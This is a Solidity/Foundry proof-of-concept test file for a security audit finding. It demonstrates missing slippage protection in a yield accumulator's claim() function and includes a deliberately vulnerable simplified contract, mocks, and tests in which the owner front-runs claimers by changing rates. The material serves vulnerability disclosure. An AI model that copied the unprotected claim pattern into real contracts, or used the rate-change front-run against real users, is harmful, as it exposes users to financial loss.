// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

/**
 * @title M-02 PoC: Missing Slippage Protection in claim()
 * @notice STANDALONE POC - No external dependencies required
 *
 * @dev Vulnerability Location: StableYieldAccumulator.sol#L420-L460
 *      https://github.com/Behodler/stable-yield-accumulator/src/StableYieldAccumulator.sol
 *
 * VULNERABILITY SUMMARY:
 * The claim() function allows external users to swap their reward token holdings for pending
 * yield strategy rewards. However, there is no mechanism for claimers to specify acceptable
 * bounds (minOutput or maxPayment). The rates used in calculation can change between the time
 * a user calls calculateClaimAmount() to get a quote and when claim() executes.
 *
 * ATTACK PATH:
 * 1. Claimer calls calculateClaimAmount() to get a quote (e.g., expects to pay 98 USDC)
 * 2. Admin/attacker front-runs with setDiscountRate() or setTokenConfig()
 * 3. Claimer's transaction executes at new (unfavorable) rates
 * 4. Claimer pays more than expected or receives less yield
 *
 * ROOT CAUSE:
 * - calculateClaimAmount() and claim() both read discountRate and tokenConfigs at execution time
 * - No mechanism to lock in a quote or specify acceptable slippage bounds
 * - Owner functions setDiscountRate() and setTokenConfig() can change rates atomically
 */

// ============ INLINED INTERFACES ============

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IYieldStrategy {
    function principalOf(address token, address account) external view returns (uint256);
    function totalBalanceOf(address token, address account) external view returns (uint256);
    function withdrawFrom(address token, address client, uint256 amount, address recipient) external;
}

interface IPhlimbo {
    function collectReward(uint256 amount) external;
}

// ============ INLINED MOCK CONTRACTS ============

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol, uint8 _decimals) {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
}

contract MockPhlimbo {
    MockERC20 public rewardToken;
    uint256 public collectedAmount;

    constructor(address _rewardToken) {
        rewardToken = MockERC20(_rewardToken);
    }

    function collectReward(uint256 amount) external {
        rewardToken.transferFrom(msg.sender, address(this), amount);
        collectedAmount += amount;
    }
}

contract MockYieldStrategy {
    mapping(address => mapping(address => uint256)) public principals;
    mapping(address => mapping(address => uint256)) public yields;
    mapping(address => bool) public authorizedWithdrawers;

    function setWithdrawer(address withdrawer, bool authorized) external {
        authorizedWithdrawers[withdrawer] = authorized;
    }

    function addYield(address token, address account, uint256 amount) external {
        yields[token][account] += amount;
    }

    function setPrincipal(address token, address account, uint256 amount) external {
        principals[token][account] = amount;
    }

    function principalOf(address token, address account) external view returns (uint256) {
        return principals[token][account];
    }

    function totalBalanceOf(address token, address account) external view returns (uint256) {
        return principals[token][account] + yields[token][account];
    }

    function withdrawFrom(address token, address, uint256 amount, address recipient) external {
        require(authorizedWithdrawers[msg.sender], "Not authorized");
        yields[token][recipient] = 0; // Clear yield on withdrawal
        MockERC20(token).transfer(recipient, amount);
    }
}

// ============ SIMPLIFIED VULNERABLE CONTRACT ============

/**
 * @notice Simplified StableYieldAccumulator showing the vulnerable pattern
 * @dev The key vulnerability is: claim() has no slippage protection parameters
 */
contract VulnerableStableYieldAccumulator {
    struct TokenConfig {
        uint8 decimals;
        uint256 normalizedExchangeRate;
        bool paused;
    }

    address public owner;
    address public rewardToken;
    address public phlimbo;
    address public minterAddress;
    uint256 public discountRate;

    address[] public yieldStrategies;
    mapping(address => bool) public isRegisteredStrategy;
    mapping(address => address) public strategyTokens;
    mapping(address => TokenConfig) public tokenConfigs;

    error ZeroAddress();
    error ZeroAmount();
    error TokenIsPaused();
    error ExceedsMaxDiscount();

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    // ============ CONFIGURATION FUNCTIONS ============

    function setRewardToken(address _rewardToken) external onlyOwner {
        rewardToken = _rewardToken;
    }

    function setPhlimbo(address _phlimbo) external onlyOwner {
        phlimbo = _phlimbo;
    }

    function setMinter(address _minter) external onlyOwner {
        minterAddress = _minter;
    }

    /**
     * @notice Sets discount rate - CALLABLE ANY TIME, NO TIMELOCK
     * @dev This is the first vector for slippage exploitation
     */
    function setDiscountRate(uint256 rate) external onlyOwner {
        if (rate > 10000) revert ExceedsMaxDiscount();
        discountRate = rate;
    }

    /**
     * @notice Sets token config including exchange rate - CALLABLE ANY TIME, NO TIMELOCK
     * @dev This is the second vector for slippage exploitation
     */
    function setTokenConfig(address token, uint8 decimals, uint256 normalizedExchangeRate) external onlyOwner {
        tokenConfigs[token].decimals = decimals;
        tokenConfigs[token].normalizedExchangeRate = normalizedExchangeRate;
    }

    function addYieldStrategy(address strategy, address token) external onlyOwner {
        yieldStrategies.push(strategy);
        isRegisteredStrategy[strategy] = true;
        strategyTokens[strategy] = token;
    }

    function approvePhlimbo(uint256 amount) external onlyOwner {
        MockERC20(rewardToken).approve(phlimbo, amount);
    }

    // ============ VULNERABLE CLAIM MECHANISM ============

    /**
     * @notice THE VULNERABLE FUNCTION - No slippage protection parameters!
     * @dev Compare to: function claim(uint256 maxPayment) external { ... }
     *      which would allow users to protect against rate changes
     */
    function claim() external {
        if (phlimbo == address(0)) revert ZeroAddress();
        if (rewardToken == address(0)) revert ZeroAddress();
        if (minterAddress == address(0)) revert ZeroAddress();

        uint256 totalNormalizedYield = 0;

        // Single pass: withdraw yield from each strategy and accumulate total
        for (uint256 i = 0; i < yieldStrategies.length; i++) {
            address strategy = yieldStrategies[i];
            address token = strategyTokens[strategy];
            if (token == address(0)) continue;
            if (tokenConfigs[token].paused) revert TokenIsPaused();

            uint256 yield = _getYieldForStrategy(strategy, token);
            if (yield > 0) {
                IYieldStrategy(strategy).withdrawFrom(token, minterAddress, yield, msg.sender);
                totalNormalizedYield += _normalizeAmount(yield, token);
            }
        }

        if (totalNormalizedYield == 0) revert ZeroAmount();

        // Calculate and collect claimer payment (apply discount)
        // NOTE: discountRate can change between calculateClaimAmount() and here!
        uint256 claimerPayment = totalNormalizedYield * (10000 - discountRate) / 10000;
        uint256 actualPayment = _denormalizeAmount(claimerPayment, rewardToken);

        // Transfer reward tokens FROM claimer TO this contract
        MockERC20(rewardToken).transferFrom(msg.sender, address(this), actualPayment);
        IPhlimbo(phlimbo).collectReward(actualPayment);
    }

    /**
     * @notice Calculates expected payment - but result NOT guaranteed at execution!
     * @dev This view function and claim() read the SAME mutable state
     */
    function calculateClaimAmount() external view returns (uint256) {
        if (minterAddress == address(0)) return 0;

        uint256 totalNormalizedYield = 0;

        for (uint256 i = 0; i < yieldStrategies.length; i++) {
            address strategy = yieldStrategies[i];
            address token = strategyTokens[strategy];
            if (token == address(0)) continue;
            if (tokenConfigs[token].paused) continue;

            uint256 yield = _getYieldForStrategy(strategy, token);
            if (yield > 0) {
                totalNormalizedYield += _normalizeAmount(yield, token);
            }
        }

        if (totalNormalizedYield == 0) return 0;

        uint256 claimerPayment = totalNormalizedYield * (10000 - discountRate) / 10000;
        return _denormalizeAmount(claimerPayment, rewardToken);
    }

    function getDiscountRate() external view returns (uint256) {
        return discountRate;
    }

    // ============ INTERNAL HELPERS ============

    function _getYieldForStrategy(address strategy, address token) internal view returns (uint256) {
        uint256 totalBalance = IYieldStrategy(strategy).totalBalanceOf(token, minterAddress);
        uint256 principal = IYieldStrategy(strategy).principalOf(token, minterAddress);
        if (totalBalance > principal) {
            return totalBalance - principal;
        }
        return 0;
    }

    function _normalizeAmount(uint256 amount, address token) internal view returns (uint256) {
        uint8 decimals = tokenConfigs[token].decimals;
        uint256 exchangeRate = tokenConfigs[token].normalizedExchangeRate;

        if (decimals == 0 && exchangeRate == 0) return amount;

        uint256 scaled = amount;
        if (decimals < 18) {
            scaled = amount * (10 ** (18 - decimals));
        }

        if (exchangeRate > 0 && exchangeRate != 1e18) {
            scaled = scaled * exchangeRate / 1e18;
        }

        return scaled;
    }

    function _denormalizeAmount(uint256 amount, address token) internal view returns (uint256) {
        uint8 decimals = tokenConfigs[token].decimals;
        uint256 exchangeRate = tokenConfigs[token].normalizedExchangeRate;

        if (decimals == 0 && exchangeRate == 0) return amount;

        uint256 scaled = amount;
        if (exchangeRate > 0 && exchangeRate != 1e18) {
            scaled = scaled * 1e18 / exchangeRate;
        }

        if (decimals < 18) {
            scaled = scaled / (10 ** (18 - decimals));
        }

        return scaled;
    }
}

// ============ TEST CONTRACT ============

contract M02PoCTest is Test {
    // Contracts
    VulnerableStableYieldAccumulator public accumulator;
    MockPhlimbo public phlimbo;
    MockYieldStrategy public yieldStrategy;

    // Tokens
    MockERC20 public usdc;  // reward token (claimer pays with this)
    MockERC20 public usdt;  // yield strategy token (claimer receives this)

    // Actors
    address public owner;
    address public claimer;
    address public minter;

    // Constants
    uint256 constant INITIAL_DISCOUNT_RATE = 200;  // 2% discount
    uint256 constant UNFAVORABLE_DISCOUNT_RATE = 0;  // 0% discount
    uint256 constant YIELD_AMOUNT = 1000e6;  // 1000 USDT

    function setUp() public {
        owner = address(this);
        claimer = makeAddr("claimer");
        minter = makeAddr("minter");

        // Deploy tokens
        usdc = new MockERC20("USD Coin", "USDC", 6);
        usdt = new MockERC20("Tether USD", "USDT", 6);

        // Deploy accumulator
        accumulator = new VulnerableStableYieldAccumulator();

        // Deploy mock phlimbo
        phlimbo = new MockPhlimbo(address(usdc));

        // Deploy mock yield strategy
        yieldStrategy = new MockYieldStrategy();

        // Configure accumulator
        accumulator.setRewardToken(address(usdc));
        accumulator.setPhlimbo(address(phlimbo));
        accumulator.setMinter(minter);
        accumulator.setDiscountRate(INITIAL_DISCOUNT_RATE);

        // Configure token configs
        accumulator.setTokenConfig(address(usdc), 6, 1e18);
        accumulator.setTokenConfig(address(usdt), 6, 1e18);

        // Add yield strategy
        accumulator.addYieldStrategy(address(yieldStrategy), address(usdt));

        // Authorize accumulator
        yieldStrategy.setWithdrawer(address(accumulator), true);

        // Setup yield
        yieldStrategy.setPrincipal(address(usdt), minter, 10000e6);
        yieldStrategy.addYield(address(usdt), minter, YIELD_AMOUNT);

        // Fund yield strategy with USDT
        usdt.mint(address(yieldStrategy), YIELD_AMOUNT);

        // Approve phlimbo
        accumulator.approvePhlimbo(type(uint256).max);

        // Fund claimer with USDC
        usdc.mint(claimer, 2000e6);

        // Claimer approves accumulator
        vm.prank(claimer);
        usdc.approve(address(accumulator), type(uint256).max);
    }

    /**
     * @notice Main PoC demonstrating the slippage vulnerability
     */
    function test_M02_MissingSlippageProtection() public {
        console.log("=== M-02 PoC: Missing Slippage Protection in claim() ===");
        console.log("");

        // Step 1: Claimer gets a quote
        console.log("Step 1: Claimer calls calculateClaimAmount() to get a quote");
        uint256 expectedPayment = accumulator.calculateClaimAmount();
        console.log("  Expected yield to receive: %s USDT", YIELD_AMOUNT / 1e6);
        console.log("  Expected payment (with 2%% discount): %s USDC", expectedPayment / 1e6);
        console.log("  Discount rate: %s basis points", accumulator.getDiscountRate());

        // Verify quote reflects 2% discount
        uint256 expectedWithDiscount = YIELD_AMOUNT * (10000 - INITIAL_DISCOUNT_RATE) / 10000;
        assertEq(expectedPayment, expectedWithDiscount, "Quote should reflect 2% discount");
        assertEq(expectedPayment, 980e6, "Expected payment should be 980 USDC");
        console.log("");

        // Step 2: Owner front-runs and changes discount rate
        console.log("Step 2: Owner front-runs and sets discount rate to 0%%");
        accumulator.setDiscountRate(UNFAVORABLE_DISCOUNT_RATE);
        console.log("  New discount rate: %s basis points", accumulator.getDiscountRate());
        console.log("");

        // Step 3: Claimer's transaction executes at new rate
        console.log("Step 3: Claimer's claim() executes at the NEW rate");
        uint256 claimerUsdcBefore = usdc.balanceOf(claimer);
        uint256 claimerUsdtBefore = usdt.balanceOf(claimer);

        vm.prank(claimer);
        accumulator.claim();

        uint256 claimerUsdcAfter = usdc.balanceOf(claimer);
        uint256 claimerUsdtAfter = usdt.balanceOf(claimer);

        uint256 actualPayment = claimerUsdcBefore - claimerUsdcAfter;
        uint256 yieldReceived = claimerUsdtAfter - claimerUsdtBefore;

        console.log("  USDT yield received: %s", yieldReceived / 1e6);
        console.log("  USDC actually paid: %s", actualPayment / 1e6);
        console.log("");

        // Step 4: Verify claimer paid MORE than expected
        console.log("Step 4: Verify claimer was adversely affected");
        uint256 overPayment = actualPayment - expectedPayment;
        console.log("  Expected to pay: %s USDC", expectedPayment / 1e6);
        console.log("  Actually paid: %s USDC", actualPayment / 1e6);
        console.log("  OVERPAYMENT: %s USDC", overPayment / 1e6);
        console.log("");

        // Assertions proving the vulnerability
        assertEq(yieldReceived, YIELD_AMOUNT, "Should receive full yield");
        assertEq(actualPayment, YIELD_AMOUNT, "Actually paid 100% (no discount)");
        assertGt(actualPayment, expectedPayment, "Paid MORE than quoted");
        assertEq(overPayment, 20e6, "Overpayment is exactly 20 USDC");

        console.log("=== VULNERABILITY CONFIRMED ===");
        console.log("The claimer has no way to protect against rate changes");
        console.log("between getting a quote and executing the claim.");
        console.log("");
        console.log("RECOMMENDATION: Add maxPayment parameter to claim():");
        console.log("  function claim(uint256 maxPayment) external { ... }");
        console.log("  require(actualPayment <= maxPayment, 'Slippage exceeded');");
    }

    /**
     * @notice Demonstrates the same vulnerability via exchange rate manipulation
     */
    function test_M02_ExchangeRateManipulation() public {
        console.log("=== M-02 PoC: Exchange Rate Manipulation ===");
        console.log("");

        // Step 1: Get initial quote
        console.log("Step 1: Claimer gets quote with 1:1 exchange rate");
        uint256 expectedPayment = accumulator.calculateClaimAmount();
        console.log("  Expected payment: %s USDC", expectedPayment / 1e6);
        console.log("");

        // Step 2: Owner changes USDT exchange rate
        console.log("Step 2: Owner changes USDT exchange rate from 1.0 to 1.1");
        accumulator.setTokenConfig(address(usdt), 6, 1.1e18);
        console.log("");

        // Step 3: Execute claim
        console.log("Step 3: Claimer's claim() executes at new exchange rate");
        uint256 claimerUsdcBefore = usdc.balanceOf(claimer);

        vm.prank(claimer);
        accumulator.claim();

        uint256 actualPayment = claimerUsdcBefore - usdc.balanceOf(claimer);
        console.log("  Actually paid: %s USDC", actualPayment / 1e6);
        console.log("");

        // Step 4: Calculate loss
        uint256 overPayment = actualPayment - expectedPayment;
        console.log("Step 4: Verify adverse impact");
        console.log("  Expected to pay: %s USDC", expectedPayment / 1e6);
        console.log("  Actually paid: %s USDC", actualPayment / 1e6);
        console.log("  OVERPAYMENT: %s USDC", overPayment / 1e6);

        assertGt(actualPayment, expectedPayment, "Paid more due to exchange rate change");

        console.log("");
        console.log("=== VULNERABILITY CONFIRMED ===");
        console.log("Exchange rate changes also expose claimer to slippage risk.");
    }

    /**
     * @notice Demonstrates race condition between quote and execution
     */
    function test_M02_QuoteVsExecutionRace() public {
        console.log("=== M-02 PoC: Quote vs Execution Race Condition ===");
        console.log("");

        console.log("Block N: Claimer gets quote");
        uint256 quoteAtBlockN = accumulator.calculateClaimAmount();
        console.log("  Quote: %s USDC", quoteAtBlockN / 1e6);
        console.log("  Discount rate: %s bps", accumulator.getDiscountRate());

        // Advance block
        vm.roll(block.number + 1);

        // Owner changes rate
        console.log("");
        console.log("Block N+1: Owner changes discount rate");
        accumulator.setDiscountRate(50);  // 0.5% discount now
        console.log("  New discount rate: %s bps", accumulator.getDiscountRate());

        // Claimer's transaction executes
        console.log("");
        console.log("Block N+1: Claimer's transaction executes");
        uint256 newQuote = accumulator.calculateClaimAmount();
        console.log("  If claimer called calculateClaimAmount() now: %s USDC", newQuote / 1e6);

        uint256 claimerUsdcBefore = usdc.balanceOf(claimer);
        vm.prank(claimer);
        accumulator.claim();
        uint256 actualPayment = claimerUsdcBefore - usdc.balanceOf(claimer);

        console.log("  Actual payment: %s USDC", actualPayment / 1e6);
        console.log("");

        uint256 unexpectedCost = actualPayment - quoteAtBlockN;
        console.log("RESULT:");
        console.log("  Expected (from quote): %s USDC", quoteAtBlockN / 1e6);
        console.log("  Actually paid: %s USDC", actualPayment / 1e6);
        console.log("  Unexpected additional cost: %s USDC", unexpectedCost / 1e6);

        assertGt(actualPayment, quoteAtBlockN, "Paid more than quoted due to race condition");

        console.log("");
        console.log("=== VULNERABILITY CONFIRMED ===");
        console.log("The quote and execution use the same mutable state,");
        console.log("creating a race condition vulnerability.");
    }
}
